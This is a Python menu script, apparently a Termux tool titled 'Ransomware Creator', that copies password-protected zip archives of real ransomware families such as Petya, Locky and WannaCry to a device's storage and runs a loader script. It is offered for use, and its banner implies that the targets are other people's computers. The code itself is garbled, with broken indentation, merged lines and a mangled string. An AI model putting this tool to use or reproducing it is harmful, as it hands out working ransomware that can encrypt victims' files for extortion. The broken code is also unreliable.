import time,os,sys,random
def slowprint(s):
        for c in s + \'\\':
            sys.stdout.write(c)        
            sys.stdout.flush()        
            time.sleep(0.1 / 100)
            os.system("clear")
            os.system("echo "" ; python warna.py ; python test.py")
            logo = """\\x1b[00m\\x1b[92m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\\x1b[92m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\\x1b[00m\\x1b[97m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\\x1b[97m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\\x1b[00m\\x1b[91m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\\x1b[91m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d           \\033[46mRANSOMWARE CREATOR BY ERR0R\\033[00m\\"""
            r1=\'Ransomware.Cerber.zip\'
            r2=\'Ransomware.Cryptowall.zip\'
            r3=\'Ransomware.Jigsaw.zip\'
            r4=\'Ransomware.Locky.zip\'
            r5=\'Ransomware.Mamba.zip\'
            r6=\'Ransomware.Matsnu.zip\'
            r7=\'Ransomware.Petrwrap.zip\'
            r8=\'Ransomware.Petya.zip\'
            r9=\'Ransomware.Radamant.zip\'
            r10=\'Ransomware.Rex.zip\'
            r11=\'Ransomware.Satana.zip\'
            r12=\'Ransomware.TeslaCrypt.zip\'
            r13=\'Ransomware.Vipasana.zip\'
            r14=\'Ransomware.WannaCry.zip\'
            r15=\'Ransomware.Wannacry_Plus.zip\'
def exit():
    print(\'\')
    print(\'\\x1b[91mExiting Program \\x1b[32m!\')
    print(\'\\x1b[93mGoodbye Motherfucker \\x1b[32m!\')
    os.system(\'xdg-open https://instagram.com/termux_hacking\')
    os.system(\'exit\')
    return

def header():
    os.system(\'clear\')
    slowprint(logo)
    time.sleep(1.0)
    print(\'\')
    os.system("python test2.py")
    print(\'\')
    print(\'\\x1b[93mRansomware\\x1b[92m Virus Creator Tools Version 1.0\')
    print("\\x1b[91mDON\'T\\x1b[92m Try to Use it on Your \\x1b[97mComputer!")
    print(\'\\x1b[00m\')
    time.sleep(0.5)
    main()



def main():
    dog = input(\'\\x1b[95mRansomware\xc2\xaeCreator~> \\x1b[33m\')
    if dog == \'\':
        print(\'\\x1b[91mCommand NOT Found!\\x1b[00m\')
        elif dog == \'clear\':
            os.system(\'clear\')
            main()
        elif dog == \'menu\':
                header()
        elif dog == \'exit\' or dog == \'Exit\':
            exit()        
        elif dog == \'help\' or dog == \'Help\':
            print(\'\\x1b[00m----------------------------------\')
            print(\'\\x1b[00m| \\x1b[32mCommands\\x1b[32m            Description\\x1b[00m|\')
            print(\'\\x1b[00m----------------------------------\')
            print(\'\\x1b[00m| \\x1b[00mHelp\\x1b[93m                How to Use\\x1b[00m |\')
            print(\'\\x1b[00m| \\x1b[00mShow\\x1b[93m      Show List Ransomware\\x1b[00m |\')
            print(\'\\x1b[00m| \\x1b[00mClear\\x1b[93m             Clear window\\x1b[00m |\')
            print(\'\\x1b[00m| \\x1b[00mMenu\\x1b[93m              Back to Menu\\x1b[00m |\')
            print(\'\\x1b[00m| \\x1b[00mEXIT\\x1b[93m              Exit Program\\x1b[00m |\')
            print(\'\\x1b[00m----------------------------------\')                
            print(\'\')
            main()
        elif dog == \'show\' or dog == \'Show\':
            print(\'\')
            print(\'\\x1b[91mThis Files are Very Sensitive\')
            print(\'\\x1b[93mBe Careful While You Using Them !\')
            print(\'\')                print(\'\\x1b[92m01. \\x1b[00mRansomware.Cerber\')
            print(\'\\x1b[92m02. \\x1b[00mRansomware.Cryptowall\')
            print(\'\\x1b[92m03. \\x1b[00mRansomware.Jigsaw\')
            print(\'\\x1b[92m04. \\x1b[00mRansomware.Locky\') 
            print(\'\\x1b[92m05. \\x1b[00mRansomware.Mamba\')
            print(\'\\x1b[92m06. \\x1b[00mRansomware.Matsnu\')
            print(\'\\x1b[92m07. \\x1b[00mRansomware.Petrwrap\')
            print(\'\\x1b[92m08. \\x1b[00mRansomware.Petya\')
            print(\'\\x1b[92m09. \\x1b[00mRansomware.Radamant\')
            print(\'\\x1b[92m10. \\x1b[00mRansomware.Rex\')
            print(\'\\x1b[92m11. \\x1b[00mRansomware.Satana\')
            print(\'\\x1b[92m12. \\x1b[00mRansomware.TeslaCrypt\')
            print(\'\\x1b[92m13. \\x1b[00mRansomware.Vipasana\')
            print(\'\\x1b[92m14. \\x1b[00mRansomware.WannaCry\')
            print(\'\\x1b[92m15. \\x1b[00mRansomware.WannaCry_Plus\')
            print(\'\')
            main()
        elif dog == \'1\':
            print(\'\\x1b[00m\')
            print(\'\\033[42m Creating Ransomware \\033[00m\')
            print(\'\\x1b[00m File name: \\x1b[33m\'+r1)
            print(\'\\x1b[00m File type: \\x1b[33m.zip\')
            print(\'\\x1b[00m Password : \\x1b[33minfected\')
            print(\'\')                
            os.system(\'cp ~/Ransomware/etc/\'+r1+\' /sdcard;sleep 3\')
            os.system(\'bash ~/Ransomware/etc/load.sh\')
            print(\'\\x1b[00m\')
            print(\'\\033[42m Completed \\033[00m\')
            print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')
            print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')
            print(\'\\x1b[00m\')
            main()
            elif dog == \'2\':
                print(\'\\x1b[00m\')
                print(\'\\033[42m Creating Ransomware \\033[00m\')
                print(\'\\x1b[00m File name: \\x1b[33m\'+r2)
                print(\'\\x1b[00m File type: \\x1b[33m.zip\')
                print(\'\\x1b[00m Password : \\x1b[33minfected\')
                print(\'\')
                os.system(\'cp ~/Ransomware/etc/\'+r2+\' /sdcard;sleep 3\')
                os.system(\'bash ~/Ransomware/etc/load.sh\')
                print(\'\\x1b[00m\')
                print(\'\\033[42m Completed \\033[00m\')
                print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')
                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')
                print(\'\\x1b[00m\')
                main()
            elif dog == \'3\':
         print(\'\\x1b[00m\')                print(\'\\033[42m Creating Ransomware \\033[00m\')                print(\'\\x1b[00m File name: \\x1b[33m\'+r3)                print(\'\\x1b[00m File type: \\x1b[33m.zip\')                print(\'\\x1b[00m Password : \\x1b[33minfected\')                print(\'\')                os.system(\'cp ~/Ransomware/etc/\'+r3+\' /sdcard;sleep 3\')                os.system(\'bash ~/Ransomware/etc/load.sh\')                print(\'\\x1b[00m\')                print(\'\\033[42m Completed \\033[00m\')                print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')                print(\'\\x1b[00m\')                main()        elif dog == \'4\':                print(\'\\x1b[00m\')                print(\'\\033[42m Creating Ransomware \\033[00m\')                print(\'\\x1b[00m File name: \\x1b[33m\'+r4)                print(\'\\x1b[00m File type: \\x1b[33m.zip\')                print(\'\\x1b[00m Password : \\x1b[33minfected\')                print(\'\')                os.system(\'cp ~/Ransomware/etc/\'+r4+\' /sdcard;sleep 3\')                os.system(\'bash ~/Ransomware/etc/load.sh\')                print(\'\\x1b[00m\')                print(\'\\033[42m Completed \\033[00m\')                print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')                print(\'\\x1b[00m\')                main()        elif dog == \'5\':                print(\'\\x1b[00m\')                print(\'\\033[42m Creating Ransomware \\033[00m\')                print(\'\\x1b[00m File name: \\x1b[33m\'+r5)                print(\'\\x1b[00m File type: \\x1b[33m.zip\')                print(\'\\x1b[00m Password : \\x1b[33minfected\')                print(\'\')                os.system(\'cp ~/Ransomware/etc/\'+r5+\' /sdcard;sleep 3\')                os.system(\'bash ~/Ransomware/etc/load.sh\')                print(\'\\x1b[00m\')                print(\'\\033[42m Completed \\033[00m\')                print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')                print(\'\\x1b[00m\')                main()        elif dog == \'6\':                print(\'\\x1b[00m\')                print(\'\\033[42m Creating Ransomware \\033[00m\')                print(\'\\x1b[00m File name: \\x1b[33m\'+r6)                print(\'\\x1b[00m File type: \\x1b[33m.zip\')                print(\'\\x1b[00m Password : \\x1b[33minfected\')                print(\'\')                os.system(\'cp ~/Ransomware/etc/\'+r6+\' /sdcard;sleep 3\')                os.system(\'bash ~/Ransomware/etc/load.sh\')                print(\'\\x1b[00m\')                print(\'\\033[42m Completed \\033[00m\')                print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')                print(\'\\x1b[00m\')                main()        elif dog == \'7\':                print(\'\\x1b[00m\')                print(\'\\033[42m Creating Ransomware \\033[00m\')                print(\'\\x1b[00m File name: \\x1b[33m\'+r7)                print(\'\\x1b[00m File type: \\x1b[33m.zip\')                print(\'\\x1b[00m Password : \\x1b[33minfected\')                print(\'\')                os.system(\'cp ~/Ransomware/etc/\'+r7+\' /sdcard;sleep 3\')                os.system(\'bash ~/Ransomware/etc/load.sh\')                print(\'\\x1b[00m\')                print(\'\\033[42m Completed \\033[00m\')                print(\'\\x1b[91m File saved as \\x1b[33m/sdcard\')                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')                print(\'\\x1b[00m\')                main()        elif dog == \'8\':                print(\'\\x1b[00m\')                print(\'\\033[42m Creating Ransomware \\033[00m\')                print(\'\\x1b[00m File name: \\x1b[33m\'+r8)                print(\'\\x1b[00m File type: \\x1b[33m.zip\')                print(\'\\x1b[00m Password : \\x1b[33minfected\')                print(\'\')                os.system(\'cp ~/Ransomware/etc/\'+r8+\' /sdcard;sleep 3\')                os.system(\'bash ~/Ransomware/etc/load.sh\')                print(\'\\x1b[00m\')                print(\'\\033[42m Completed \\033[00m\')                print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')                print(\'\\x1b[00m\')                main()        elif dog == \'9\':                print(\'\\x1b[00m\')                print(\'\\033[42m Creating Ransomware \\033[00m\')                print(\'\\x1b[00m File name: \\x1b[33m\'+r9)                print(\'\\x1b[00m File type: \\x1b[33m.zip\')                print(\'\\x1b[00m Password : \\x1b[33minfected\')                print(\'\')                os.system(\'cp ~/Ransomware/etc/\'+r9+\' /sdcard;sleep 3\')                os.system(\'bash ~/Ransomware/etc/load.sh\')                print(\'\\x1b[00m\')                print(\'\\033[42m Completed \\033[00m\')                print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')                print(\'\\x1b[00m\')                main()        elif dog == \'10\':                print(\'\\x1b[00m\')                print(\'\\033[42m Creating Ransomware \\033[00m\')                print(\'\\x1b[00m File name: \\x1b[33m\'+r10)                print(\'\\x1b[00m File type: \\x1b[33m.zip\')                print(\'\\x1b[00m Password : \\x1b[33minfected\')                print(\'\')                os.system(\'cp ~/Ransomware/etc/\'+r10+\' /sdcard;sleep 3\')                os.system(\'bash ~/Ransomware/etc/load.sh\')                print(\'\\x1b[00m\')                print(\'\\033[42m Completed \\033[00m\')                print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')                print(\'\\x1b[00m\')                main()        elif dog == \'11\':                print(\'\\x1b[00m\')                print(\'\\033[42m Creating Ransomware \\033[00m\')                print(\'\\x1b[00m File name: \\x1b[33m\'+r11)                print(\'\\x1b[00m File type: \\x1b[33m.zip\')                print(\'\\x1b[00m Password : \\x1b[33minfected\')                print(\'\')                os.system(\'cp ~/Ransomware/etc/\'+r11+\' /sdcard;sleep 3\')                os.system(\'bash ~/Ransomware/etc/load.sh\')                print(\'\\x1b[00m\')                print(\'\\033[42m Completed \\033[00m\')                print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')                print(\'\\x1b[00m\')                main()        elif dog == \'12\':                print(\'\\x1b[00m\')                print(\'\\033[42m Creating Ransomware \\033[00m\')                print(\'\\x1b[00m File name: \\x1b[33m\'+r12)                print(\'\\x1b[00m File type: \\x1b[33m.zip\')                print(\'\\x1b[00m Password : \\x1b[33minfected\')                print(\'\')                os.system(\'cp ~/Ransomware/etc/\'+r12+\' /sdcard;sleep 3\')                os.system(\'bash ~/Ransomware/etc/load.sh\')                print(\'\\x1b[00m\')                print(\'\\033[42m Completed \\033[00m\')                print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')                print(\'\\x1b[00m\')                main()        elif dog == \'13\':                print(\'\\x1b[00m\')                print(\'\\033[42m Creating Ransomware \\033[00m\')                print(\'\\x1b[00m File name: \\x1b[33m\'+r13)                print(\'\\x1b[00m File type: \\x1b[33m.zip\')                print(\'\\x1b[00m Password : \\x1b[33minfected\')                print(\'\')                os.system(\'cp ~/Ransomware/etc/\'+r13+\' /sdcard;sleep 3\')                os.system(\'bash ~/Ransomware/etc/load.sh\')                print(\'\\x1b[00m\')                print(\'\\033[42m Completed \\033[00m\')                print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')                print(\'\\x1b[00m\')                main()        elif dog == \'14\':                print(\'\\x1b[00m\')                print(\'\\033[42m Creating Ransomware \\033[00m\')                print(\'\\x1b[00m File name: \\x1b[33m\'+r14)                print(\'\\x1b[00m File type: \\x1b[33m.zip\')                print(\'\\x1b[00m Password : \\x1b[33minfected\')                print(\'\')                os.system(\'cp ~/Ransomware/etc/\'+r14+\' /sdcard;sleep 3\')                os.system(\'bash ~/Ransomware/etc/load.sh\')                print(\'\\x1b[00m\')                print(\'\\033[42m Completed \\033[00m\')                print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')                print(\'\\x1b[00m\')                main()        elif dog == \'15\':                print(\'\\x1b[00m\')                print(\'\\033[42m Creating Ransomware \\033[00m\')                print(\'\\x1b[00m File name: \\x1b[33m\'+r15)                print(\'\\x1b[00m File type: \\x1b[33m.zip\')                print(\'\\x1b[00m Password : \\x1b[33minfected\')                print(\'\')                os.system(\'cp ~/Ransomware/etc/\'+r15+\' /sdcard;sleep 3\')                os.system(\'bash ~/Ransomware/etc/load.sh\')                print(\'\\x1b[00m\')                print(\'\\033[42m Completed \\033[00m\')                print(\'\\x1b[92m File saved as \\x1b[33m/sdcard\')                print(\'\\x1b[00m For back to main menu, type: \\x1b[33mmenu\')                print(\'\\x1b[00m\')                main()        else:                print(\'\\x1b[33mCommand NOT Found!\\x1b[00m\')                main()header()'